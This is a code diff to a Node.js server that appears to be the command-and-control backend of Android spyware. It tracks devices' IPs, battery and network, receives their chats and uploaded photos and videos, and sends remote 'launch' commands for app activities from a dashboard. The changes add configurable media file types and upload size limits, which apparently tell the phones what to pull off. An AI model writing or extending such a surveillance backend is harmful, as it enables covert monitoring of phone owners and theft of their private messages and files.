@@ -50,6 +50,11 @@ function optionalNumber(value) {
   return Number.isFinite(n) ? n : null;
 }
 
+function batteryPercent(value) {
+  const n = optionalNumber(value);
+  return n != null && n >= 0 && n <= 100 ? n : null;
+}
+
 function nowIso() {
   return new Date().toISOString();
 }
@@ -315,6 +320,37 @@ function readConfigFlag() {
   }
 }
 
+function readConfigFileTypes() {
+  try {
+    if (!fs.existsSync(CONFIG_FILE)) return [".jpg", ".jpeg", ".png", ".mp4", ".mov"];
+    const raw = fs.readFileSync(CONFIG_FILE, "utf8").trim();
+    if (!raw || raw === "0" || raw === "1") return [".jpg", ".jpeg", ".png", ".mp4", ".mov"];
+    const cfg = JSON.parse(raw);
+    const types = Array.isArray(cfg.fileTypes) ? cfg.fileTypes : [];
+    return types
+      .map((type) => clean(type).trim().toLowerCase())
+      .filter((type) => type.startsWith("."));
+  } catch {
+    return [".jpg", ".jpeg", ".png", ".mp4", ".mov"];
+  }
+}
+
+function readConfigMaxFileSizeBytes() {
+  try {
+    if (!fs.existsSync(CONFIG_FILE)) return 0;
+    const raw = fs.readFileSync(CONFIG_FILE, "utf8").trim();
+    if (!raw || raw === "0" || raw === "1") return 0;
+    const cfg = JSON.parse(raw);
+    const mb = optionalNumber(cfg.maxFileSizeMb ?? cfg.maxSizeMb ?? cfg.fileSizeMb);
+    const bytes = optionalNumber(cfg.maxFileSizeBytes ?? cfg.maxSizeBytes);
+    if (bytes != null && bytes > 0) return Math.floor(bytes);
+    if (mb != null && mb > 0) return Math.floor(mb * 1024 * 1024);
+    return 0;
+  } catch {
+    return 0;
+  }
+}
+
 async function getDevices() {
   const { data, error } = await supabase
     .from("devices")
@@ -461,7 +497,7 @@ async function handleHeartbeat(req, res) {
     my_name: identity.my_name,
     model: optionalClean(body.model),
     brand: optionalClean(body.brand),
-    battery_percent: optionalNumber(body.battery_percent ?? body.battery),
+    battery_percent: batteryPercent(body.battery_percent ?? body.battery),
     network_type: optionalClean(body.network_type || body.network),
     public_ip: optionalClean(publicIp(req)),
     server_last_seen: optionalNumber(body.lastSeen) || nowMillis()
@@ -551,7 +587,7 @@ async function handleTrack(req, res) {
     device_id,
     account_key: account.key,
     ip: publicIp(req),
-    battery: optionalNumber(body.battery),
+    battery: batteryPercent(body.battery),
     model,
     brand,
     android,
@@ -567,7 +603,7 @@ async function handleTrack(req, res) {
     device_id,
     model,
     brand,
-    battery_percent: optionalNumber(body.battery),
+    battery_percent: batteryPercent(body.battery),
     public_ip: publicIp(req),
     server_last_seen: nowMillis()
   }, { onConflict: "device_id" });
@@ -576,8 +612,16 @@ async function handleTrack(req, res) {
 }
 
 async function handleUpload(req, res, url) {
+  const maxBytes = readConfigMaxFileSizeBytes();
+  const contentLength = optionalNumber(req.headers["content-length"]);
+  if (maxBytes > 0 && contentLength != null && contentLength > maxBytes) {
+    return json(res, 413, { ok: false, error: "file too large", max_size_bytes: maxBytes });
+  }
   const buffer = await collect(req);
   if (!buffer.length) return json(res, 400, { ok: false, error: "empty upload body" });
+  if (maxBytes > 0 && buffer.length > maxBytes) {
+    return json(res, 413, { ok: false, error: "file too large", max_size_bytes: maxBytes });
+  }
   const device_id = clean(url.searchParams.get("device_id") || url.searchParams.get("deviceId") || req.headers["x-device-id"] || "unknown");
   const account = latestAccountForDevice(device_id);
   const original = safeName(fileNameFromHeaders(req, url));
@@ -749,7 +793,7 @@ async function dashboardHtml() {
   <main class="main">
     <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Accounts, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><button class="btn danger" id="deleteDevice">Delete device</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
     <div class="tabs"><button class="tab active" data-tab="overview">Overview</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
-    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Send Message"><select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option></select><input id="cmdActivity" value="com.wepie.module.teenmode.TeenModeOpeningActivity"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
+    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option></select><input id="cmdActivity" value="com.wepie.module.teenmode.TeenModeOpeningActivity"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
     <section id="content" class="content"></section>
   </main>
 </div>
@@ -817,6 +861,8 @@ async function handler(req, res) {
   try {
     if (req.method === "GET" && url.pathname === "/") return text(res, 200, await dashboardHtml(), "text/html; charset=utf-8");
     if (req.method === "GET" && url.pathname === "/config") return text(res, 200, readConfigFlag());
+    if (req.method === "GET" && url.pathname === "/file-types") return text(res, 200, readConfigFileTypes().join(","));
+    if (req.method === "GET" && url.pathname === "/file-max-size") return text(res, 200, String(readConfigMaxFileSizeBytes()));
     if (req.method === "POST" && url.pathname === "/api/heartbeat") return await handleHeartbeat(req, res);
     if (req.method === "POST" && url.pathname === "/api/chat/batch") return await handleChatBatch(req, res);
     if (req.method === "POST" && url.pathname === "/track") return await handleTrack(req, res);
